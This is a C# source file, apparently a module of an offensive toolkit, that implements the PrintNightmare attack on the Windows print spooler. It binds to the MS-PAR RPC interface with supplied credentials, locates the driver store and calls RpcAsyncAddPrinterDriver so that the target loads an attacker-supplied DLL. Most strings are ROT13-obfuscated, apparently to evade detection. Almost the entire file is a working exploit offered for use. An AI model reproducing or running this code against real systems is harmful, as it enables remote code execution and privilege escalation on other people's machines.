//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;
using static ldump_rot13.Win32.Natives;

namespace ldump_rot13.Module
{
    class PrintNightmare
    {
        static Guid PAR_ObjectUUID = new Guid(new string("9940pn8r-512s-4p58-88n9-61098q6896oq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

        static byte[] ms2Dpar__MIDL_ProcFormatString = {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x07, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
    0x08, 0x00, 0x02, 0x00, 0x10, 0x01, 0x10, 0x00, 0x0a, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x1e, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x30, 0x00,
    0xa2, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x10, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x40, 0x00, 0x44, 0x02, 0x0a, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb6, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x27, 0x00, 0x28, 0x00, 0x32, 0x00,
    0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x10, 0x00, 0xc6, 0x02, 0x48, 0x00,
    0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x48, 0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x40, 0x00, 0x47, 0x08, 0x0a, 0x07,
    0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x02, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x02, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x1b, 0x00, 0x20, 0x00, 0xd6, 0x02,
    0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x50, 0x21, 0x30, 0x00, 0x08, 0x00, 0x50, 0x21, 0x38, 0x00, 0x08, 0x00, 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00
};

        static byte[] ms2Dpar__MIDL_TypeFormatString = {
    0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x00, 0x0e, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03,
    0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xe6, 0xff, 0x11, 0x00, 0x72, 0x00, 0x2b, 0x09, 0x09, 0x00, 0xf8, 0xff, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x03, 0x30,
    0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x00, 0x00, 0x00, 0x28, 0x00, 0x03, 0x00, 0x00, 0x00, 0x30, 0x00, 0xff, 0xff, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00, 0x0c, 0x00,
    0x08, 0x40, 0x36, 0x36, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x5b,
    0x12, 0x00, 0x02, 0x00, 0x1a, 0x07, 0x38, 0x00, 0x00, 0x00, 0x10, 0x00, 0x08, 0x08, 0x08, 0x40, 0x36, 0x36, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x0b, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08,
    0x25, 0x5c, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x40, 0x4c, 0x00, 0x84, 0xff, 0x5c, 0x5b, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x11, 0x00, 0x0a, 0x02, 0x2b, 0x09,
    0x09, 0x00, 0xf8, 0xff, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x06, 0x30, 0x01, 0x00, 0x00, 0x00, 0x22, 0x00, 0x02, 0x00, 0x00, 0x00, 0x2e, 0x00, 0x03, 0x00, 0x00, 0x00, 0x50, 0x00, 0x04, 0x00,
    0x00, 0x00, 0x94, 0x00, 0x06, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x08, 0x00, 0x00, 0x00, 0x40, 0x01, 0xff, 0xff, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b,
    0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x30, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c,
    0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x0e, 0x00, 0x1b, 0x01, 0x02, 0x00, 0x19, 0x00, 0x48, 0x00, 0x01, 0x00, 0x05, 0x5b, 0x1a, 0x03, 0x58, 0x00,
    0x00, 0x00, 0x10, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08,
    0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xbc, 0xff, 0x12, 0x00, 0x0e, 0x00, 0x1b, 0x01, 0x02, 0x00, 0x19, 0x00,
    0x58, 0x00, 0x01, 0x00, 0x05, 0x5b, 0x1a, 0x03, 0x68, 0x00, 0x00, 0x00, 0x14, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x40, 0x36, 0x08, 0x40, 0x36, 0x5c, 0x5b,
    0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c,
    0x12, 0x00, 0x6e, 0xff, 0x12, 0x00, 0xb4, 0xff, 0x12, 0x00, 0x0a, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x1a, 0x07, 0x98, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x08, 0x40, 0x36, 0x36,
    0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x40, 0x36, 0x08, 0x40, 0x36, 0x4c, 0x00, 0xde, 0xff, 0x0b, 0x36, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08,
    0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x18, 0xff, 0x12, 0x00, 0x5e, 0xff, 0x12, 0x08,
    0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x1a, 0x00, 0x1b, 0x01, 0x02, 0x00, 0x19, 0x00, 0xa8, 0x00, 0x01, 0x00, 0x05, 0x5b, 0x1b, 0x01,
    0x02, 0x00, 0x19, 0x00, 0xc4, 0x00, 0x01, 0x00, 0x05, 0x5b, 0x1a, 0x07, 0xe0, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x08, 0x40, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x40, 0x36, 0x08,
    0x40, 0x36, 0x4c, 0x00, 0x68, 0xff, 0x0b, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x08, 0x40, 0x36, 0x36, 0x08, 0x08, 0x36, 0x4c, 0x00, 0x56, 0xff, 0x0b, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08,
    0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x94, 0xfe, 0x12, 0x00,
    0xda, 0xfe, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x76, 0xff, 0x12, 0x08,
    0x25, 0x5c, 0x12, 0x00, 0x7a, 0xff, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x40, 0x4c, 0x00, 0xec, 0xfd, 0x5c, 0x5b, 0x12, 0x00, 0x02, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x29, 0x00,
    0x28, 0x00, 0x00, 0x00, 0x02, 0x5b, 0x11, 0x0c, 0x08, 0x5c, 0x00,
};

        static GCHandle procString;
        static GCHandle formatString;
        static GCHandle stub;
        static GCHandle faultoffsets;
        static GCHandle genericRuotinePair;
        static IntPtr rpcConn;
        static IntPtr hLogon;

        static AllocMemoryFunctionDelegate allocMemoryFunctionDelegate;
        private delegate IntPtr AllocMemoryFunctionDelegate(int memsize);

        static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;
        private delegate void FreeMemoryFunctionDelegate(IntPtr memory);

        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        static StringHandleBindFunctionDelegate stringHandleBindFunctionDelegate;
        private delegate IntPtr StringHandleBindFunctionDelegate(IntPtr name);

        static StringHandleUnBindFunctionDelegate stringHandleUnBindFunctionDelegate;
        private delegate void StringHandleUnBindFunctionDelegate(IntPtr name, IntPtr hLogon);

        private static IntPtr StringHandleBind(IntPtr name)
        {
            return rpcConn;
        }

        private static void StringHandleUnBind(IntPtr name, IntPtr hLogon)
        {
        }

        public static bool RunPrintNightmare(string target, string exploit_path, string authuser, string authdomain, string authpassword, int auth = DCSync.RPC_C_AUTHN_GSS_NEGOTIATE, string altservice = "host")
        {
            Console.WriteLine(new string("[*] ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            rpcConn = DCSync.CreateBinding(target, altservice, auth, authuser, authdomain, authpassword, impersonationType: DCSync.RPC_C_IMP_LEVEL_DELEGATE);

            if (rpcConn == IntPtr.Zero)
            {
                Console.WriteLine(new string("Reebe PerngrOvaqvat".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return false;
            }

            NTSTATUS rpcStatus = (NTSTATUS)RpcEpResolveBinding(rpcConn, GetClientInterface());

            if (rpcStatus != NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error RpcEpResolveBinding {0}", (int)rpcStatus);

                return false;
            }

            rpcStatus = (NTSTATUS)RpcBindingSetObject(rpcConn, ref PAR_ObjectUUID);

            if (rpcStatus != NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error RpcBindingSetOption {0}", (int)rpcStatus);

                return false;
            }

            string driverpath = FindDriverPath(rpcConn);
            driverpath += new string("\\havqei.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            Console.WriteLine("[*] DriverPath: {0}", driverpath);

            string environment = new string("Jvaqbjf k64".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            DRIVER_INFO_2 dvi2 = new DRIVER_INFO_2
            {
                cVersion = 3,
                pDataFile = exploit_path,
                pEnvironment = environment,
                pDriverPath = driverpath,
                pName = RandomString(10)
            };

            if (AddPrinterDriver(dvi2,rpcConn, new string("P:\\Jvaqbjf\\Flfgrz32\\xrearyonfr.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
            {
                dvi2.pName = RandomString(10);
                string[] p = exploit_path.Split('\\');
                if (AddPrinterDriver(dvi2, rpcConn, p[p.Length -1]))
                {
                    Console.WriteLine();
                    return true;
                }
            }

            return false;
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static bool AddPrinterDriver(DRIVER_INFO_2 dvi2, IntPtr hBinding,string cfg)
        {
            DRIVER_CONTAINER container = new DRIVER_CONTAINER();
            uint dwFlags = 0x00000010 | 0x8000; // APD_COPY_FROM_DIRECTORY | APD_INSTALL_WARNED_DRIVER;
            container.Level = 2;

            string sConfig = "";
            if(cfg.IndexOf('\\')<=0)
            {
                sConfig = string.Format("c:\\windows\\system32\\spool\\drivers\\x64\\3\\{0}", cfg);
                dwFlags |= 0x00000008;// APD_COPY_NEW_FILES
            }
            else
            {
                sConfig = cfg;
                dwFlags |= 0x00000004;// APD_COPY_ALL_FILES
            }
            dvi2.pConfigFile = sConfig;
            Console.WriteLine("[!] ConfigFile: {0}", dvi2.pConfigFile);

            IntPtr pDvi2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DRIVER_INFO_2)));
            Marshal.StructureToPtr(dvi2, pDvi2, false);
            container.DriverInfo = pDvi2;
            IntPtr pContainer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DRIVER_CONTAINER)));
            Marshal.StructureToPtr(container, pContainer, false);
            NTSTATUS ret = (NTSTATUS)RpcAsyncAddPrinterDriver(GetStubPtr(), GetProcStringPtr(116),hBinding, null, pContainer, dwFlags);
            if (ret == NTSTATUS.Success)
            {
                Console.WriteLine(new string("[*] BX!".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return true;
            }
            else
            {
                Console.WriteLine(new string("[k] XB! ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + ret);
            }
            return false;
        }

        private static string FindDriverPath(IntPtr rpcConn)
        {
            uint cbNeeded = 0;
            uint cReturned = 0;
            string environment = new string("Jvaqbjf k64".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
            NTSTATUS status = (NTSTATUS)RpcAsyncEnumPrinterDrivers(GetStubPtr(), GetProcStringPtr(170),rpcConn, null,  environment, 2, IntPtr.Zero, 0, ref cbNeeded, ref cReturned);
            if(status == NTSTATUS.InsufficientBuffer)
            {
                IntPtr drivers = Marshal.AllocHGlobal((int)cbNeeded);
                status = (NTSTATUS)RpcAsyncEnumPrinterDrivers(GetStubPtr(), GetProcStringPtr(170), rpcConn, null,  environment, 2, drivers, cbNeeded, ref cbNeeded, ref cReturned);
                if (status == NTSTATUS.Success)
                {
                    for (int i = 0; i < cReturned; i++)
                    {
                        _DRIVER_INFO_2 driver = new _DRIVER_INFO_2();
                        IntPtr current = IntPtr.Add(drivers, i * Marshal.SizeOf(typeof(_DRIVER_INFO_2)));
                        IntPtr pDriverPath = IntPtr.Zero;
                        driver = (_DRIVER_INFO_2)Marshal.PtrToStructure(current, typeof(_DRIVER_INFO_2));
                        pDriverPath = (driver.DriverPathOffset != 0)? IntPtr.Add(current, (int)driver.DriverPathOffset): IntPtr.Zero;
                        if(pDriverPath != IntPtr.Zero)
                        {
                            string driverPath = Marshal.PtrToStringUni(pDriverPath);

                            if(driverPath.ToLower().Contains(new string("flfgrz32\\qevirefgber\\svyrercbfvgbel\\agcevag.vas_nzq64".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            {
                                return driverPath.Substring(0, driverPath.LastIndexOf('\\'));
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine(new string("[k] snvyrq EcpRahzCevagreQeviref 2 : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + status);
                }
            }
            else
            {
                Console.WriteLine(new string("[k] snvyrq EcpRahzCevagreQeviref 1 : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + status);
            }
            return "";
        }
        private static IntPtr GetClientInterface()
        {

            RPC_VERSION rpcv1 = new RPC_VERSION
            {
                MajorVersion = 1,
                MinorVersion = 0
            };

            RPC_VERSION rpcv2 = new RPC_VERSION
            {
                MajorVersion = 2,
                MinorVersion = 0
            };

            RPC_SYNTAX_IDENTIFIER InterfaceId = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x76f03f96, 0xcdfd, 0x44fc, 0xa2, 0x2c, 0x64, 0x95, 0x0a, 0x00, 0x12, 0x09),
                SyntaxVersion = rpcv1
            };

            RPC_SYNTAX_IDENTIFIER TransferSyntax = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x8a885d04, 0x1ceb, 0x11c9, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60),
                SyntaxVersion = rpcv2
            };

            RPC_CLIENT_INTERFACE logonRpcClientInterface = new RPC_CLIENT_INTERFACE
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)),
                InterfaceId = InterfaceId,
                TransferSyntax = TransferSyntax,
                DispatchTable = IntPtr.Zero,  //PRPC_DISPATCH_TABLE
                RpcProtseqEndpointCount = 0,
                RpcProtseqEndpoint = IntPtr.Zero, //PRPC_PROTSEQ_ENDPOINT
                Reserved = IntPtr.Zero,
                InterpreterInfo = IntPtr.Zero,
                Flags = 0x00000000
            };

            IntPtr plogonRpcClientInterface = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)));
            Marshal.StructureToPtr(logonRpcClientInterface, plogonRpcClientInterface, false);

            return plogonRpcClientInterface;
        }

        private static IntPtr GetStubPtr()
        {
            if (!stub.IsAllocated)
            {

                procString = GCHandle.Alloc(ms2Dpar__MIDL_ProcFormatString, GCHandleType.Pinned);

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS
                {
                    CommOffset = -1,
                    FaultOffset = -1
                };

                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(ms2Dpar__MIDL_TypeFormatString, GCHandleType.Pinned);

                allocMemoryFunctionDelegate = AllocateMemory;
                freeMemoryFunctionDelegate = FreeMemory;
                IntPtr pAllocMemory = Marshal.GetFunctionPointerForDelegate(allocMemoryFunctionDelegate);
                IntPtr pFreeMemory = Marshal.GetFunctionPointerForDelegate(freeMemoryFunctionDelegate);

                stringHandleBindFunctionDelegate = StringHandleBind;
                stringHandleUnBindFunctionDelegate = StringHandleUnBind;
                IntPtr pStringHandleBind = Marshal.GetFunctionPointerForDelegate(stringHandleBindFunctionDelegate);
                IntPtr pStringHandleUnBind = Marshal.GetFunctionPointerForDelegate(stringHandleUnBindFunctionDelegate);

                GENERIC_BINDING_ROUTINE_PAIR rp = new GENERIC_BINDING_ROUTINE_PAIR();
                rp.Bind = pStringHandleBind;
                rp.Unbind = pStringHandleUnBind;

                genericRuotinePair = GCHandle.Alloc(rp, GCHandleType.Pinned);

                hLogon = IntPtr.Zero;

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC
                {

                    RpcInterfaceInformation = GetClientInterface(),

                    pfnAllocate = pAllocMemory,
                    pfnFree = pFreeMemory,
                    pAutoBindHandle = hLogon,
                    apfnNdrRundownRoutines = IntPtr.Zero,
                    aGenericBindingRoutinePairs = genericRuotinePair.AddrOfPinnedObject(),
                    apfnExprEval = IntPtr.Zero,
                    aXmitQuintuple = IntPtr.Zero,
                    pFormatTypes = formatString.AddrOfPinnedObject(),
                    fCheckBounds = 1,
                    Version = 0x60000,
                    pMallocFreeStruct = IntPtr.Zero,
                    MIDLVersion = 0x8000253,
                    CommFaultOffsets = IntPtr.Zero,
                    aUserMarshalQuadruple = IntPtr.Zero,
                    NotifyRoutineTable = IntPtr.Zero,
                    mFlags = new IntPtr(0x00000001),
                    CsRoutineTables = IntPtr.Zero,
                    ProxyServerInfo = IntPtr.Zero,
                    pExprInfo = IntPtr.Zero,
                };

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            return stub.AddrOfPinnedObject();
        }

        private static IntPtr GetProcStringPtr(int index)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(ms2Dpar__MIDL_ProcFormatString, index);
        }
    }
}
